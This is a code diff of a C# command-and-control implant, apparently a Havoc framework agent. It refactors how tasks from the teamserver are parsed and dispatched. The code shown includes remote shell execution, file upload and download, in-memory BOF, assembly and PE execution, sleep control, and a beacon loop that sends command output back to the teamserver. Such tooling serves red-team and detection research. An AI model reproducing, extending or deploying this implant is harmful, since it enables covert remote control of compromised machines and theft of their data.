@@ -36,10 +36,14 @@ namespace HavocImplant
         {
             public string taskCommand;
             public string taskOutput;
+            public string taskArguments;
+            public string taskFile;
             public task(string taskCommand, string taskOutput)
             {
                 this.taskCommand = taskCommand;
                 this.taskOutput = taskOutput;
+                taskArguments = "";
+                taskFile = "";
             }
         }
 
@@ -55,8 +59,6 @@ namespace HavocImplant
         public string processName = Process.GetCurrentProcess().ProcessName;
         public string osVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
 
-        // Locking resource related stuff
-        static readonly object pe_lock = new object();
 
         public static List<CommandInterface> Commands = new List<CommandInterface>();
 
@@ -96,26 +98,22 @@ namespace HavocImplant
                 if (rawTasks.Length > 4)
                 {
                     int offset = 0;
-                    string task = "";
+                    task Task;
 
                     // Parsing the raw request from teamserver, splitting task into dictionary entries
                     while (offset < rawTasks.Length)
                     {
 
-                        int size = BitConverter.ToInt32(new List<byte>(rawTasks).GetRange(offset, 4).ToArray(), 0); // [4 bytes containing size of task][task]
-                        Console.WriteLine($"Task is of size {size}");
+                        int size = BitConverter.ToInt32(new List<byte>(rawTasks).GetRange(offset, 4).ToArray(), 0) - 1; // [4 bytes containing size of task][task]
+                        Console.WriteLine($"Task JSON is of size {size}");
 
-                        string dirtyTask = Encoding.UTF8.GetString(rawTasks, offset + 4, size); // Clear up the funky
-                        List<byte> dirtyArray = Encoding.UTF8.GetBytes(dirtyTask).ToList<byte>();
-                        dirtyArray.RemoveAll(item => item == 0x00);
-
-                        task = Encoding.UTF8.GetString(dirtyArray.ToArray());
-                        Console.WriteLine($"Task is {task}");
-
+                        Task = Communications.Utils.ParseTask(rawTasks, size, offset);
+                        Console.WriteLine($"Task is {Task.taskCommand}");
+                        Console.WriteLine($"Args are {Task.taskArguments}");
                         offset += size + 4;
 
                         int taskId = rand.Next(10000 * 10000);
-                        implant.taskingInformation.Add(taskId, new Implant.task(task, ""));
+                        implant.taskingInformation.Add(taskId, Task);
                         Console.WriteLine("Task has id {0}", taskId);
 
                     }
@@ -125,70 +123,11 @@ namespace HavocImplant
                     // Parsing the commands from the dictionary
                     for (int i = 0; i < implant.taskingInformation.Count; i++)
                     {
-                        string command = implant.taskingInformation.Values.ToList<Implant.task>()[i].taskCommand;
 
-                        int taskId = implant.taskingInformation.Keys.ToList<int>()[i];
-                        Console.WriteLine("The ID is: {0}", taskId);
-
-                        switch (command.Split(' ')[0])
-                        {
-                            case "shell":
-                                await HandleCommand(command, taskId);
-                                break;
-                            case "goodbye":
-                                Console.WriteLine("It is die time my dudes"); Environment.Exit(Environment.ExitCode); break;
-                                
-                            case "sleep":
-                                Thread sleepThread = new Thread(() => AgentFunctions.Sleep.Run(implant, command.Substring(5).Trim(), taskId));
-                                sleepThread.Start();
-                                break;
-                            case "ls":
-                                Thread lsThread = new Thread(() => AgentFunctions.Ls.Run(implant, command.Substring(2).Trim(), taskId));
-                                lsThread.Start();
-                                break;
-                            case "upload":
-                                Thread uploadThread = new Thread(() => AgentFunctions.Upload.Run(implant, command.Substring(6).Trim(), taskId));
-                                uploadThread.Start();
-                                break;
-                            case "download":
-                                Thread downloadThread = new Thread(() => AgentFunctions.Download.Run(implant, command.Substring(8).Trim(), taskId));
-                                downloadThread.Start();
-                                break;
-                            case "bofexec":
-                                /*
-                                List<string> bofArgs = command.Substring(7).Trim().Split(';').ToList<string>();
-                                List<string> bof = new List<string>();
-                                if (bofArgs.Count > 2)
-                                {
-                                    bof.Add(bofArgs[bofArgs.Count-1]);
-                                    bofArgs.RemoveAt(bofArgs.Count-1);
-                                }
-                                
-                                Console.WriteLine($"bofArgs count: {bofArgs.Count}");
-                                for (int ii = 0; ii < bofArgs.Count; ii++)
-                                {
-                                    Console.WriteLine($"Arg {ii} is: {bofArgs[ii]}");
-                                }
-                                */
-                                string[] bofArgs = new string[] { command.Substring(7).Trim() };
-                                Thread bofExecThread = new Thread(() => AgentFunctions.BofExec.BofExec.Run(implant, bofArgs, taskId));
-                                bofExecThread.Start();
-                                break;
-                                
-                            case "inline_assembly":
-                                Thread inlineAssemblyThread = new Thread(() => AgentFunctions.InlineAssembly.Run(implant, command.Substring(15).Trim(), taskId));
-                                inlineAssemblyThread.Start();
-                                break;
-                                
-                            case "inline_pe":
-                                lock (pe_lock)
-                                {
-                                    Thread inlinePEThread = new Thread(() => AgentFunctions.InlinePE.Run(implant, command.Substring(9).Trim(), taskId));
-                                    inlinePEThread.Start();
-                                    break;
-                                }
-                                
-                        }
+                        int taskId = implant.taskingInformation.Keys.ToList()[i];
+                        Console.WriteLine("The current id is: {0}", taskId);
+                        HandleCommand(implant.taskingInformation[taskId], taskId);
+                        
                     }
                 }
                 Thread.Sleep(implant.sleepTime);
@@ -196,14 +135,14 @@ namespace HavocImplant
 
                 for (int i = 0; i < implant.taskingInformation.Count; i++)
                 {
-                    int taskId = implant.taskingInformation.Keys.ToList<int>()[i];
+                    int taskId = implant.taskingInformation.Keys.ToList()[i];
                     if (!String.IsNullOrEmpty(implant.taskingInformation[taskId].taskOutput))
                     {
                         Console.WriteLine($"Shipping off Task ID {taskId}");
                         cumalativeOutput += implant.taskingInformation[taskId].taskOutput + "\n";
                         implant.taskingInformation.Remove(taskId);
+                        i--;
                     }
-                    i--;
                 }
                 Comms.CheckIn(implant, cumalativeOutput, "commandoutput");
             }
@@ -250,10 +189,10 @@ namespace HavocImplant
             
         }
 
-        public static async Task HandleCommand(string command, int taskId)
+        public static async Task HandleCommand(task Task, int taskId)
         {
-            var com = Commands.FirstOrDefault(c => c.Command == command.Split(' ')[0]);
-            com.Run(command.Substring(5).Trim(), taskId);
+            var com = Commands.FirstOrDefault(c => c.Command == Task.taskCommand);
+            com.Run(taskId);
         }
     }
 }
